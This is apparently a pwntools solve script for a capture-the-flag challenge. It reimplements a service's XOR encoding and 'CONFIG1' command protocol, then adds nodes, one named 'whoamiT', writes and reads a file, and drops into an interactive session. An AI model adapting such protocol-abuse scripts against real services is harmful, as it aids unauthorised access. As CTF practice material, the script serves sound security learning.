from pwn import *
from struct import pack, unpack

#p = remote("0.0.0.0", 1498)
p = remote("challenges.ctfd.io", 31153)

def encrypt(data):
	data = [i for i in data]
	for i in range(len(data) // 8):
		for j in range(256):
			data[8 * i + j % 8] ^= 35 * j % 240

	return data

def get(x=10):
	sz = 4096
	t = False
	if (x in [4,8]):
		t = True
		sz = 8

	tmp = p.recv(sz)
	data = encrypt(tmp)

	if t:
		if (data[-1] == 0):
			print("Error")
		elif (data[-1] == 9):
			print("Success")
		else:
			print(bytes(data[-1]))
	else:
		print(bytes(data))

def get_file():
	log.info("Getting Last File Data")
	tmp = b"CONFIG1" + pack("B", 1)
	payload = bytes(encrypt(tmp))
	p.send(payload)
	get()

def del_node(name):
	log.info("Deleting Node Name : %s", name)
	l1 = len(name)

	tmp = b"CONFIG1" + pack("B", 2) + pack("I", l1) + name.encode()
	payload = bytes(encrypt(tmp))
	p.send(payload)
	get(4)

def get_node_data(name):
	log.info("Getting Node Data Name : %s", name)
	l1 = len(name)

	tmp = b"CONFIG1" + pack("B", 3) + pack("I", l1) + name.encode()
	payload = bytes(encrypt(tmp))
	p.send(payload)
	get()

def add_node(name, data):
	log.info("Adding Node Name : %s Data : %s", name,data)
	l1 = len(name)
	l2 = len(data)

	tmp = b"CONFIG1" + pack("B", 4) + pack("I", l1+l2) + name.encode() + b":" + data.encode()
	payload = bytes(encrypt(tmp))
	p.send(payload)
	get(4)

def info():
	log.info("Getting info")
	tmp = b"CONFIG1" + pack("B", 5)
	payload = bytes(encrypt(tmp))
	p.send(payload)
	tmp = bytes(encrypt(p.recv(16)))
	x = unpack("I", tmp[8:12])[0]
	filename = tmp[12:16]
	print(f"Nodes : {x} Filename : {filename}")

def write_file():
	log.info("Writing Node to file")
	tmp = b"CONFIG1" + pack("B", 7)
	payload = bytes(encrypt(tmp))
	p.send(payload)
	get(8)

def read_file():
	log.info("Reading File")
	tmp = b"CONFIG1" + pack("B", 8)
	payload = bytes(encrypt(tmp))
	p.send(payload)
	get()

#context.log_level = "DEBUG"

add_node("1GN1tE0", "Data0")
add_node("whoamiT", "Data1")

write_file()
read_file()

'''
get_node_data("1GN1tE0")

info()
add_node("flag", "flag")
get_file()

get_node_data("1GN1tE0")
get_file()




del_node("1GN1tE0")
get_node_data("1GN1tE0")

#del_node("1GN1tE0")

get_file()
info()

read_file()
#'''
p.interactive()